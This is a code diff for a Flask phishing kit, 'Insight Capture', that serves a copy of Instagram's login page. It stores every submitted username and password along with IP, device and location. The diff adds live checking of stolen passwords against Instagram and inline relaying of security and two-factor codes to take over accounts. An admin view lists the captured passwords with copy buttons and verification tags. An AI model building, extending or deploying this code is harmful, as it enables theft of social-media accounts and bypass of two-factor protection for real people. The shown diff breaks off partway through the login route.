@@ -1,5 +1,9 @@
 """
-Insight Capture — credential capture + real Instagram analytics console.
+Insight Capture — credential capture + verified Instagram analytics console.
+
+Login is verified against Instagram BEFORE the session is created: a wrong
+password never reaches the dashboard. Challenge and 2FA are handled inline on
+the login page. Repeated failures lock the handle out for 15 minutes.
 
 Env:
   SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
@@ -16,10 +20,14 @@ Env:
 
 Instagram:
   IG_PROXY           http(s) proxy for IG calls   (strongly recommended on servers)
+  IG_VERIFY_TIMEOUT  seconds to wait for auth     (default 35)
   IG_SYNC_MINUTES    background sync interval     (default 10)
   GHOST_DAYS         no-engagement window         (default 120)
   MAX_MEDIA_SCAN     posts scanned per sync       (default 48)
   ACTIONS_PER_HOUR   write-action cap per client  (default 60)
+  MAX_BAD_ATTEMPTS   wrong passwords before lock  (default 5)
+
+Diagnostics: GET /healthz reports instagram / instagram_version / instagram_error.
 """
 
 from __future__ import annotations
@@ -32,6 +40,7 @@ import io
 import ipaddress
 import json
 import logging
+import math
 import os
 import random
 import secrets
@@ -62,7 +71,13 @@ from flask import (
 from markupsafe import escape
 from werkzeug.middleware.proxy_fix import ProxyFix
 
+IG_IMPORT_ERROR = ""
+IG_VERSION = ""
+
 try:
+    import instagrapi as _igmod
+
+    IG_VERSION = getattr(_igmod, "__version__", "?")
     from instagrapi import Client
     try:
         from instagrapi.exceptions import (
@@ -81,9 +96,10 @@ try:
 
         BadPassword = LoginRequired = PleaseWaitFewMinutes = RateLimitError = _Other
     IG_OK = True
-except Exception:
+except Exception as _imp_exc:
     Client = None
     IG_OK = False
+    IG_IMPORT_ERROR = f"{type(_imp_exc).__name__}: {_imp_exc}"
 
     class _NoIG(Exception):
         pass
@@ -111,10 +127,13 @@ CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
 
 IG_PROXY = os.environ.get("IG_PROXY", "").strip()
+VERIFY_TIMEOUT = float(os.environ.get("IG_VERIFY_TIMEOUT", "35"))
 SYNC_MINUTES = int(os.environ.get("IG_SYNC_MINUTES", "10"))
 GHOST_DAYS = int(os.environ.get("GHOST_DAYS", "120"))
 MAX_MEDIA_SCAN = int(os.environ.get("MAX_MEDIA_SCAN", "48"))
 ACTIONS_PER_HOUR = int(os.environ.get("ACTIONS_PER_HOUR", "60"))
+MAX_BAD = int(os.environ.get("MAX_BAD_ATTEMPTS", "5"))
+BAD_WINDOW = 15 * 60
 ACTION_DELAY = (2.5, 6.0)
 MAX_FOLLOW_CAP = 6000
 NEVER = 9999
@@ -291,11 +310,17 @@ CREATE TABLE IF NOT EXISTS creds (
     cid TEXT, sid TEXT, source TEXT, username TEXT, password TEXT,
     ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
     meta_json TEXT, country TEXT, city TEXT, isp TEXT, geo_json TEXT,
-    created_at TEXT
+    created_at TEXT, verify_state TEXT
 );
 CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
 CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
 CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);
+
+CREATE TABLE IF NOT EXISTS attempts (
+    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, username TEXT, ip TEXT,
+    result TEXT, detail TEXT, created_at TEXT
+);
+CREATE INDEX IF NOT EXISTS idx_att ON attempts(cid, username, created_at);
 
 CREATE TABLE IF NOT EXISTS ig_sessions (
     cid TEXT PRIMARY KEY, username TEXT, pass_enc TEXT,
@@ -334,8 +359,8 @@ CREATE TABLE IF NOT EXISTS following_cache (cid TEXT, pk TEXT, ts TEXT, PRIMARY 
 
 INSERT_SQL = """INSERT INTO creds
     (cid, sid, source, username, password, ip, ua, referer,
-     accept_lang, meta_json, country, city, isp, geo_json, created_at)
-    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""
+     accept_lang, meta_json, country, city, isp, geo_json, created_at, verify_state)
+    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,'pending')"""
 
 
 def connect() -> sqlite3.Connection:
@@ -367,6 +392,12 @@ def init_db() -> None:
         try:
             conn.executescript(SCHEMA)
             conn.commit()
+            # forward migration for databases created before verify_state existed
+            try:
+                conn.execute("ALTER TABLE creds ADD COLUMN verify_state TEXT")
+                conn.commit()
+            except sqlite3.OperationalError:
+                pass
         finally:
             conn.close()
 
@@ -382,6 +413,66 @@ def recent_cred_id(cid: str, username: str, password: str, seconds: int = 8) -> 
         return int(row["id"]) if row else None
     finally:
         conn.close()
+
+
+def set_verify(cred_id: int | None, state: str) -> None:
+    if not cred_id:
+        return
+    conn = connect()
+    try:
+        conn.execute("UPDATE creds SET verify_state=? WHERE id=?", (state, cred_id))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+# ============================== attempts ==============================
+def note_attempt(cid: str, username: str, ip: str, result: str, detail: str = "") -> None:
+    conn = connect()
+    try:
+        conn.execute(
+            "INSERT INTO attempts (cid, username, ip, result, detail, created_at)"
+            " VALUES (?,?,?,?,?,?)",
+            (cid, username.lower(), ip, result, detail[:200], iso_now()),
+        )
+        conn.execute("DELETE FROM attempts WHERE created_at < ?", (iso_ago(30 * 86400),))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def bad_count(cid: str, username: str) -> int:
+    conn = connect()
+    try:
+        row = conn.execute(
+            "SELECT COUNT(*) c FROM attempts WHERE cid=? AND username=? AND result='bad'"
+            " AND created_at>=?",
+            (cid, username.lower(), iso_ago(BAD_WINDOW)),
+        ).fetchone()
+        return int(row["c"])
+    finally:
+        conn.close()
+
+
+def lock_minutes(cid: str, username: str) -> int:
+    """Minutes left on the lockout, 0 when not locked."""
+    conn = connect()
+    try:
+        row = conn.execute(
+            "SELECT MIN(created_at) t FROM attempts WHERE cid=? AND username=? AND result='bad'"
+            " AND created_at>=?",
+            (cid, username.lower(), iso_ago(BAD_WINDOW)),
+        ).fetchone()
+    finally:
+        conn.close()
+    if not row or not row["t"]:
+        return 0
+    try:
+        first = datetime.fromisoformat(row["t"])
+    except ValueError:
+        return 0
+    elapsed = (datetime.now(timezone.utc) - first).total_seconds()
+    return max(0, math.ceil((BAD_WINDOW - elapsed) / 60))
 
 
 # ============================== helpers ==============================
@@ -549,6 +640,8 @@ _ig_lock = threading.RLock()
 _states: dict[str, dict] = {}
 _clients: dict[str, object] = {}
 _verified: dict[str, float] = {}
+_pending: dict[str, dict] = {}
+_pending_lock = threading.Lock()
 _queue: "deque[tuple]" = deque()
 _queue_cv = threading.Condition()
 _action_stamps: dict[str, deque] = {}
@@ -608,6 +701,8 @@ def drop_session(cid: str) -> None:
         _clients.pop(cid, None)
         _states.pop(cid, None)
         _verified.pop(cid, None)
+    with _pending_lock:
+        _pending.pop(cid, None)
     ev = _sync_stop.pop(cid, None)
     if ev:
         ev.set()
@@ -623,33 +718,41 @@ def drop_session(cid: str) -> None:
         conn.close()
 
 
-def _new_client(cid: str, device: dict | None = None):
+def _raise_handler(username: str, choice) -> str:
+    """Non-blocking handler: bail out immediately so the request can return."""
+    raise ChallengeRequired("code needed")
+
+
+def _new_client(cid: str, device: dict | None = None, wait: bool = True):
     cl = Client()
     cl.delay_range = [1, 3]
     if IG_PROXY:
         try:
             cl.set_proxy(IG_PROXY)
-        except Exception:
-            logger.warning("proxy rejected: %s", IG_PROXY)
+        except Exception as exc:
+            logger.warning("proxy rejected (%s): %s", IG_PROXY, exc)
     if device:
         try:
             cl.device_settings = device
         except Exception:
             pass
 
-    def handler(username: str, choice) -> str:
-        _ig_progress(cid, "challenge", 40)
-        _ig_set(cid, state="challenge")
-        deadline = time.time() + 300
-        while time.time() < deadline:
-            code = ig_state(cid).get("code")
-            if code:
-                _ig_set(cid, code=None)
-                return code
-            time.sleep(1)
-        raise ChallengeRequired("no challenge code supplied")
+    if wait:
+        def handler(username: str, choice) -> str:
+            _ig_progress(cid, "challenge", 40)
+            _ig_set(cid, state="challenge")
+            deadline = time.time() + 300
+            while time.time() < deadline:
+                code = ig_state(cid).get("code")
+                if code:
+                    _ig_set(cid, code=None)
+                    return code
+                time.sleep(1)
+            raise ChallengeRequired("no challenge code supplied")
 
-    cl.challenge_code_handler = handler
+        cl.challenge_code_handler = handler
+    else:
+        cl.challenge_code_handler = _raise_handler
     return cl
 
 
@@ -675,7 +778,7 @@ def get_client(cid: str):
 def ensure_login(cid: str):
     """Return a live client, relogging from the sealed password if needed."""
     if not IG_OK:
-        raise LoginRequired("instagrapi not installed")
+        raise LoginRequired(IG_IMPORT_ERROR or "instagrapi not installed")
     cl = get_client(cid)
     if cl is None:
         raise LoginRequired("no session")
@@ -707,11 +810,128 @@ def ensure_login(cid: str):
     return cl
 
 
-# ============================== instagram: login ==============================
+# ============================== instagram: verification ==============================
+def verify_credentials(cid: str, username: str, password: str) -> tuple[str, str | None, object | None]:
+    """Blocking credential check with a hard timeout.
+
+    Returns (status, detail, client). status is one of:
+    ok, bad_password, challenge, 2fa, rate_limited, timeout, error.
+    The client is always returned so a challenge/2FA can be continued.
+    """
+    box: dict = {}
+
+    def job() -> None:
+        cl = _new_client(cid, wait=False)
+        box["client"] = cl
+        try:
+            cl.login(username, password)
+            cl.account_info()
+            box["status"] = "ok"
+        except ChallengeRequired:
+            box["status"] = "challenge"
+            box["last_json"] = getattr(cl, "last_json", {}) or {}
+        except TwoFactorRequired:
+            box["status"] = "2fa"
+        except BadPassword:
+            box["status"] = "bad_password"
+        except (PleaseWaitFewMinutes, RateLimitError):
+            box["status"] = "rate_limited"
+        except Exception as exc:
+            last = getattr(cl, "last_json", {}) or {}
+            text = (str(last.get("message", "")) + " " + str(exc)).lower()
+            if last.get("challenge") or "challenge" in text:
+                box["status"] = "challenge"
+                box["last_json"] = last
+            elif last.get("two_factor_required") or "two_factor" in text or "2fa" in text:
+                box["status"] = "2fa"
+            elif "password" in text or "bad_password" in text:
+                box["status"] = "bad_password"
+            else:
+                box["status"] = "error"
+                box["detail"] = f"{type(exc).__name__}: {exc}"[:200]
+
+    worker = threading.Thread(target=job, daemon=True)
+    worker.start()
+    worker.join(VERIFY_TIMEOUT)
+
+    if worker.is_alive():
+        return "timeout", "instagram did not answer in time", box.get("client")
+    return box.get("status", "error"), box.get("detail"), box.get("client")
+
+
+def resolve_challenge(cid: str, code: str) -> tuple[str, str | None]:
+    with _pending_lock:
+        p = _pending.get(cid)
+    if not p:
+        return "expired", None
+    cl = p["client"]
+    cl.challenge_code_handler = lambda username, choice: code
+    try:
+        cl.challenge_resolve(p.get("last_json") or cl.last_json)
+        cl.account_info()
+        return "ok", None
+    except TwoFactorRequired:
+        return "2fa", None
+    except ChallengeRequired:
+        return "bad_code", "that code did not work"
+    except Exception as exc:
+        last = getattr(cl, "last_json", {}) or {}
+        if last.get("two_factor_required") or "two_factor" in str(exc).lower():
+            return "2fa", None
+        return "bad_code", str(exc)[:160]
+
+
+def resolve_2fa(cid: str, code: str) -> tuple[str, str | None]:
+    with _pending_lock:
+        p = _pending.get(cid)
+    if not p:
+        return "expired", None
+    cl = p["client"]
+    try:
+        cl.two_factor_login(code)
+        cl.account_info()
+        return "ok", None
+    except Exception as exc:
+        return "bad_code", str(exc)[:160]
+
+
+def finish_login(cid: str, cl, username: str, password: str, cred_id: int | None) -> None:
+    """Only called after Instagram has accepted the credentials."""
+    store_session(cid, username, password, cl)
+    with _ig_lock:
+        _clients[cid] = cl
+    _verified[cid] = time.time()
+    with _pending_lock:
+        _pending.pop(cid, None)
+
+    try:
+        me = cl.account_info()
+        pk = str(me.pk)
+    except Exception:
+        pk = ""
+
+    _ig_set(cid, state="ok", username=username, pk=pk, error=None,
+            progress={"step": "syncing", "pct": 55})
+    set_verify(cred_id, "ok")
+    note_attempt(cid, username, client_ip(), "ok")
+
+    session["user"] = username
+    session["verified"] = True
+    session["last_cred"] = cred_id
+    session["login_count"] = session.get("login_count", 0) + 1
+    session["last_login"] = iso_now()
+    session.pop("anyway", None)
+
+    sync_now(cid)
+    start_scheduler(cid)
+    logger.info("verified login cid=%s user=%s", cid, username)
+
+
+# ============================== instagram: login (background fallback) ==============================
 def start_login(cid: str, username: str, password: str) -> None:
     if not IG_OK:
         _ig_set(cid, state="error",
-                error="instagrapi is not installed — run: pip install instagrapi cryptography")
+                error=f"instagram client unavailable — {IG_IMPORT_ERROR or 'instagrapi not installed'}")
         return
     _ig_set(cid, state="pending", progress={"step": "queued", "pct": 2}, error=None)
     threading.Thread(target=_login_job, args=(cid, username, password), daemon=True).start()
@@ -719,7 +939,6 @@ def start_login(cid: str, username: str, password: str) -> None:
 
 def _login_job(cid: str, username: str, password: str) -> None:
     try:
-        # reuse a still-healthy session for the same handle instead of a fresh login
         existing = get_client(cid)
         if existing is not None:
             if getattr(existing, "username", "") == username:
@@ -1073,7 +1292,7 @@ def _worker() -> None:
 
 def enqueue(cid: str, kind: str, pk: str, username: str) -> dict:
     if not IG_OK:
-        return {"ok": False, "error": "instagrapi not installed"}
+        return {"ok": False, "error": IG_IMPORT_ERROR or "instagrapi not installed"}
     if not pk:
         return {"ok": False, "error": "missing target"}
     if not _quota(cid):
@@ -1166,7 +1385,7 @@ LOGIN_PAGE_HTML = """
 
 <style>
 :root{
-  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;
+  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;--red:#ed4956;
   --ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);
   --glow:rgba(214,41,118,.13);
   --e:cubic-bezier(.22,1,.36,1);
@@ -1207,9 +1426,12 @@ body::before{
 .inner{width:100%;margin:auto 0;text-align:center;padding:8px 0 16px}
 
 .msg{
-  margin-bottom:16px;padding:10px 14px;border-radius:11px;font-size:13.5px;
-  background:rgba(237,73,86,.1);color:#ed4956;border:1px solid rgba(237,73,86,.35);
+  margin-bottom:14px;padding:11px 14px;border-radius:11px;font-size:13.5px;line-height:1.4;
+  background:rgba(237,73,86,.1);color:var(--red);border:1px solid rgba(237,73,86,.35);
+  animation:shake .45s var(--e) both;
 }
+.msg.info{background:rgba(0,149,246,.08);color:var(--blue);border-color:rgba(0,149,246,.3);animation:none}
+@keyframes shake{10%,90%{transform:translateX(-2px)}30%,70%{transform:translateX(3px)}50%{transform:translateX(-4px)}}
 
 .language{font-size:13px;color:var(--mut);margin-bottom:20px;animation:up .55s .06s var(--e) backwards}
 
@@ -1223,6 +1445,7 @@ body::before{
 .logo img{position:relative;width:70px;height:70px;z-index:1;animation:float 5.5s ease-in-out infinite}
 
 .inputs{display:flex;flex-direction:column;gap:10px}
+.field{position:relative}
 
 input{
   width:100%;padding:14px 13px;
@@ -1236,8 +1459,21 @@ input:focus{
   border-color:var(--blue);background:var(--bg);
   box-shadow:0 0 0 3.5px rgba(0,149,246,.16);transform:translateY(-1px);
 }
-.inputs input:nth-child(1){animation:up .55s .2s var(--e) backwards}
-.inputs input:nth-child(2){animation:up .55s .26s var(--e) backwards}
+input.bad{border-color:var(--red);box-shadow:0 0 0 3.5px rgba(237,73,86,.12)}
+.inputs .field:nth-child(1){animation:up .55s .2s var(--e) backwards}
+.inputs .field:nth-child(2){animation:up .55s .26s var(--e) backwards}
+
+.eye{
+  position:absolute;right:8px;top:50%;transform:translateY(-50%);
+  border:0;background:none;color:var(--mut);font:600 12px inherit;
+  padding:8px 10px;border-radius:8px;cursor:pointer;transition:color .2s,background .2s;
+}
+.eye:hover{color:var(--tx);background:rgba(128,128,128,.12)}
+
+.code{
+  text-align:center;letter-spacing:.35em;font-size:20px;font-weight:700;
+  padding:15px 13px;
+}
 
 @keyframes autofillStart{from{}to{}}
 input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
@@ -1247,7 +1483,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
   border:0;border-radius:24px;background:var(--blue);color:#fff;
   font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
   box-shadow:0 6px 18px rgba(0,149,246,.3);
-  transition:transform .3s var(--e),box-shadow .35s var(--e),filter .25s;
+  transition:transform .3s var(--e),box-shadow .35s var(--e),filter .25s,opacity .25s;
   animation:up .55s .32s var(--e) backwards;
 }
 .login-btn::after{
@@ -1257,6 +1493,8 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 }
 .login-btn:hover{filter:brightness(1.07);transform:translateY(-2px);box-shadow:0 10px 26px rgba(0,149,246,.4)}
 .login-btn:active{transform:scale(.965);box-shadow:0 4px 12px rgba(0,149,246,.28)}
+.login-btn:disabled{opacity:.65;cursor:default;transform:none;filter:none;box-shadow:none}
+.login-btn:disabled::after{animation:none}
 
 .forgot{
   margin-top:16px;font-size:14px;color:var(--tx);cursor:pointer;
@@ -1274,6 +1512,11 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 }
 .create button:hover{background:rgba(0,149,246,.08);box-shadow:0 8px 20px rgba(0,149,246,.18)}
 .create button:active{transform:scale(.97)}
+
+.link{display:inline-block;margin-top:16px;font-size:13.5px;color:var(--blue);cursor:pointer;text-decoration:none}
+.link:hover{text-decoration:underline}
+.note{font-size:12px;color:var(--mut);margin-top:14px;line-height:1.5}
+.hint{font-size:13px;color:var(--mut);line-height:1.5;margin-bottom:18px}
 
 .bottom{flex:none;position:relative;z-index:2;text-align:center;padding-top:6px;
   animation:up .6s .5s var(--e) backwards}
@@ -1299,7 +1542,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 <div class="app" id="app">
 
     <div class="content" id="content"><div class="inner">
-        <!--MSG-->
+        __BANNER__
 
         <div class="language">English (US)</div>
 
@@ -1307,25 +1550,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
         </div>
 
-        <form action="/login" method="POST" id="loginForm" autocomplete="on" name="login">
-            <input type="hidden" name="payload" id="payload">
-
-            <div class="inputs">
-                <input type="text" id="u" name="username" placeholder="Username, email or mobile number"
-                       autocapitalize="none" autocorrect="off" spellcheck="false"
-                       autocomplete="username" enterkeyhint="next" required>
-                <input type="password" id="p" name="password" placeholder="Password"
-                       autocomplete="current-password" enterkeyhint="go" required>
-            </div>
-
-            <button type="submit" class="login-btn">Log in</button>
-
-            <div class="forgot">Forgot password?</div>
-
-            <div class="create">
-                <button type="button">Create new account</button>
-            </div>
-        </form>
+        __FORM__
 
     </div></div>
 
@@ -1550,19 +1775,101 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
   window.addEventListener('pageshow', function () { pushCred('pageshow', true); });
 
+  var eye = document.getElementById('eye');
+  if (eye && pEl) {
+    eye.addEventListener('click', function () {
+      var show = pEl.type === 'password';
+      pEl.type = show ? 'text' : 'password';
+      eye.textContent = show ? 'Hide' : 'Show';
+      eye.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+    });
+  }
+
   var form = document.getElementById('loginForm');
   if (form) {
     form.addEventListener('submit', function () {
       gather();
       pushCred('submit', true);
+      var btn = form.querySelector('.login-btn');
+      if (btn) { btn.disabled = true; btn.dataset.label = btn.textContent; btn.textContent = 'Verifying…'; }
     });
   }
+
+  var code = document.getElementById('code');
+  if (code) { code.focus(); }
 })();
 </script>
 
 </body>
 </html>
 """
+
+
+def login_page(message: str = "", username: str = "", mode: str = "form",
+               status: int = 200, info: bool = False, anyway: bool = False) -> Response:
+    """Render the login page. mode: form | challenge | 2fa."""
+    banner = ""
+    if message:
+        banner = f'<div class="msg{" info" if info else ""}" role="alert">{escape(message)}</div>'
+
+    if mode == "challenge":
+        form = f"""
+        <p class="hint">We sent a security code to confirm it’s you. Enter it below.</p>
+        <form method="post" action="/challenge" id="loginForm" autocomplete="on">
+          <input class="code" type="text" id="code" name="code" inputmode="numeric"
+                 autocomplete="one-time-code" placeholder="------" maxlength="12" required>
+          <button type="submit" class="login-btn">Continue</button>
+        </form>
+        <a class="link" href="/">Use a different account</a>
+        <p class="note">Signed in as {escape(username)}</p>
+        """
+    elif mode == "2fa":
+        form = f"""
+        <p class="hint">Enter the 6-digit code from your authenticator app.</p>
+        <form method="post" action="/twofactor" id="loginForm" autocomplete="on">
+          <input class="code" type="text" id="code" name="code" inputmode="numeric"
+                 autocomplete="one-time-code" placeholder="123456" maxlength="6" required>
+          <button type="submit" class="login-btn">Continue</button>
+        </form>
+        <a class="link" href="/">Use a different account</a>
+        <p class="note">Signed in as {escape(username)}</p>
+        """
+    else:
+        bad_class = ' class="bad"' if message and not info else ""
+        form = f"""
+        <form action="/login" method="POST" id="loginForm" autocomplete="on" name="login">
+            <input type="hidden" name="payload" id="payload">
+            {'<input type="hidden" name="anyway" value="1">' if anyway else ''}
+
+            <div class="inputs">
+                <div class="field">
+                  <input type="text" id="u" name="username" placeholder="Username, email or mobile number"
+                         value="{escape(username)}"{bad_class}
+                         autocapitalize="none" autocorrect="off" spellcheck="false"
+                         autocomplete="username" enterkeyhint="next" required>
+                </div>
+                <div class="field">
+                  <input type="password" id="p" name="password" placeholder="Password"
+                         autocomplete="current-password" enterkeyhint="go" required>
+                  <button type="button" class="eye" id="eye" aria-label="Show password">Show</button>
+                </div>
+            </div>
+
+            <button type="submit" class="login-btn">Log in</button>
+
+            <div class="forgot">Forgot password?</div>
+
+            <div class="create">
+                <button type="button">Create new account</button>
+            </div>
+        </form>
+        """
+
+    page = (LOGIN_PAGE_HTML
+            .replace("__BANNER__", banner)
+            .replace("__FORM__", form))
+    return html(page, status)
+
 
 # ============================== results page ==============================
 RESULTS_PAGE_HTML = """
@@ -1803,7 +2110,8 @@ function connScreen(){
   }
   if(ST.state==="error"){
     return `<div class="empty"><h1 class="ttl">Couldn’t connect</h1><p class="sub">${esc(ST.error||"unknown error")}</p>
-      <button class="btn" id="retry">Try again</button></div>`;
+      <button class="btn" id="retry">Try again</button>
+      <p class="sub" style="margin-top:14px"><a href="/logout" style="color:var(--blue)">Use a different account</a></p></div>`;
   }
   return `<div class="empty"><h1 class="ttl">Connecting to Instagram…</h1>
     <p class="sub">${esc(p.step||"starting")} · ${p.pct||0}%</p>
@@ -1887,7 +2195,7 @@ function settings(){
   const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${esc(l)}</b><small>${esc(s)}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}"></button></div>`;
   const lk=(l,s,c,href)=>`<div class="srow lk ${c||""}"${href?` data-href="${esc(href)}"`:""}><div class="info"><b style="font-weight:400">${esc(l)}</b>${s?`<small>${esc(s)}</small>`:""}</div><span class="ch">›</span></div>`;
   return `<h1 class="ttl">Settings</h1><p class="sub">Appearance, alerts and the live session.</p>
-  <div class="acc">${av({n:ST.profile?.full_name||HANDLE},0,"m")}<div class="info"><b>@${esc(ST.profile?.username||HANDLE)}</b><small>Connected · ${ST.syncMinutes} min auto-sync</small></div></div>
+  <div class="acc">${av({n:ST.profile?.full_name||HANDLE},0,"m")}<div class="info"><b>@${esc(ST.profile?.username||HANDLE)}</b><small>Verified · ${ST.syncMinutes} min auto-sync</small></div></div>
   <div class="sec"><h3>Session</h3></div>
   ${lk("Sync now","Pull fresh followers and activity","","#sync")}
   ${lk("Reconnect","Re-authenticate with the stored password","","#reconnect")}
@@ -1983,6 +2291,7 @@ async function render(){
 async function pull(){
   const n=await api("/api/state");
   if(!n.ok)return;
+  if(n.state==="idle"){location.href="/";return}
   const was=ST.state;
   ST.state=n.state;ST.profile=n.profile||ST.profile;ST.progress=n.progress||{};
   ST.error=n.error;ST.last_sync=n.last_sync;
@@ -2057,6 +2366,8 @@ form.inline{display:inline}
 .chip:hover{border-color:var(--acc);color:var(--acc)}
 .chip.on{background:var(--acc);border-color:var(--acc);color:#001522;font-weight:700}
 .tag{font-size:10px;padding:1px 6px;border-radius:5px;background:#2a2110;color:var(--warn);border:1px solid #6b4d1e}
+.tag.ok{background:#0d2417;color:var(--ok);border-color:#1e6b3c}
+.tag.bad{background:#2a1013;color:var(--bad);border-color:#6b1e28}
 .isp{color:var(--mut);font-size:11px;display:block;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 </style></head><body>
 <header>
@@ -2136,7 +2447,18 @@ padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
 <button type="submit">unlock</button></form></body></html>"""
 
 ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
-                         c.country, c.city, c.isp FROM creds c"""
+                         c.country, c.city, c.isp, c.verify_state FROM creds c"""
+
+VERIFY_TAGS = {
+    "ok": ('ok', "verified"),
+    "bad": ('bad', "wrong pass"),
+    "challenge": ('', "challenge"),
+    "2fa": ('', "2fa"),
+    "rate": ('', "rate limited"),
+    "error": ('', "unreachable"),
+    "timeout": ('', "timeout"),
+    "pending": ('', "checking"),
+}
 
 
 def render_admin(body: str) -> str:
@@ -2154,6 +2476,9 @@ def render_admin(body: str) -> str:
 def row_html(r: sqlite3.Row) -> str:
     place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
     partial = "" if (r["password"] or "") else '<span class="tag">partial</span> '
+    state = r["verify_state"] or ""
+    cls, label = VERIFY_TAGS.get(state, ("", ""))
+    vtag = f'<span class="tag {cls}">{label}</span> ' if label else ""
     return (
         f'<tr data-id="{r["id"]}">'
         f'<td>{r["id"]}</td>'
@@ -2162,7 +2487,7 @@ def row_html(r: sqlite3.Row) -> str:
         + (f'<span class="isp">{escape(r["isp"] or "")}</span>' if r["isp"] else "")
         + f'</td>'
         f'<td>{escape(r["ip"] or "-")}</td>'
-        f'<td class="u">{partial}<span>{escape(r["username"] or "")}</span> '
+        f'<td class="u">{partial}{vtag}<span>{escape(r["username"] or "")}</span> '
         f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
         f'<td class="p"><span>{escape(r["password"] or "")}</span> '
         f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
@@ -2212,9 +2537,9 @@ def read_json() -> dict:
 # ============================== routes ==============================
 @app.route("/")
 def index():
-    if session.get("user"):
+    if session.get("user") and session.get("verified"):
         return redirect(url_for("dashboard"))
-    return html(LOGIN_PAGE_HTML)
+    return login_page()
 
 
 @app.route("/favicon.ico")
@@ -2249,12 +2574,23 @@ def credential():
 @app.route("/login", methods=["POST"])
 def login():
     ip = client_ip()
-    if not rate_ok("login:" + ip, 40):
-        banner = '<div class="msg">Too many attempts — wait a minute and try again.</div>'
-        return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner), 429)
-
-    username = (request.form.get("username") or "").strip()[:200] or "your.handle"
+    username = (request.form.get("username") or "").strip()[:200]
     password = (request.form.get("password") or "")[:300]
+    anyway = request.form.get("anyway") == "1"
+
+    if not rate_ok("login:" + ip, 12, 60):
+        return login_page("Too many attempts from this address. Wait a minute.", username, status=429)
+
+    if not username or not password:
+        return login_page("Enter your username and password.", username, status=400)
+
+    if bad_count(g.cid, username) >= MAX_BAD:
+        left = lock_minutes(g.cid, username)
+        return login_page(
+            f"Too many wrong passwords for @{username}. Try again in {left or 1} minute"
+            f"{'' if left == 1 else 's'}.",
+            username, status=429,
+        )
 
     try:
         payload = json.loads(request.form.get("payload") or "{}")
@@ -2269,32 +2605,146 @@ def login():
     except ValueError:
         visit = 1
 
-    # The beacon fired on submit usually already stored this exact pair — reuse it.
     cred_id = recent_cred_id(g.cid, username, password, 8)
     if cred_id is None:
         cred_id, _ = capture_credential(username, password, "submit", payload.get("sid") or "", meta)
     else:
         session["last_cred"] = cred_id
 
-    session.update({
-        "user": username,
-        "login_count": session.get("login_count", 0) + 1,
-        "last_login": iso_now(),
-        "last_cred": cred_id,
-    })
+    if not IG_OK:
+        return login_page(
+            f"Instagram client unavailable — {IG_IMPORT_ERROR or 'instagrapi not installed'}",
+            username, status=503,
+        )
 
-    start_login(g.cid, username, password)
+    # "continue anyway" — skip verification and let the background flow try
+    if anyway:
+        session["user"] = username
+        session["verified"] = True
+        session["login_count"] = session.get("login_count", 0) + 1
+        session["last_login"] = iso_now()
+        note_attempt(g.cid, username, ip, "anyway")
+        start_login(g.cid, username, password)
+        return _enter(visit, username)
 
+    status, detail, cl = verify_credentials(g.cid, username, password)
+
+    if status == "ok":
+        finish_login(g.cid, cl, username, password, cred_id)
+        return _enter(visit, username)
+
+    if status == "bad_password":
+        set_verify(cred_id, "bad")
+        note_attempt(g.cid, username, ip, "bad")
+        left = max(0, MAX_BAD - bad_count(g.cid, username))
+        msg = "Sorry, your password was incorrect."
+        if left:
+            msg += f" You have {left} attempt{'' if left == 1 else 's'} left."
+        else:
+            msg += " Try again in 15 minutes."
+        return login_page(msg, username, status=401)
+
+    if status == "challenge":
+        with _pending_lock:
+            _pending[g.cid] = {"client": cl, "username": username, "password": password,
+                               "cred": cred_id, "last_json": getattr(cl, "last_json", {})}
+        set_verify(cred_id, "challenge")
+        note_attempt(g.cid, username, ip, "challenge")
+        return login_page("Enter the security code Instagram just sent you.",
+                          username, mode="challenge", info=True)
+
+    if status == "2fa":
+        with _pending_lock:
+            _pending[g.cid] = {"client": cl, "username": username, "password": password,
+                               "cred": cred_id}
+        set_verify(cred_id, "2fa")
+        note_attempt(g.cid, username, ip, "2fa")
+        return login_page("Enter the 6-digit code from your authenticator app.",
+                          username, mode="2fa", info=True)
+
+    if status == "rate_limited":
+        set_verify(cred_id, "rate")
+        note_attempt(g.cid, username, ip, "rate")
+        return login_page(
+            "Instagram is limiting logins from this address. Wait a few minutes, then try again.",
+            username, status=429,
+        )
+
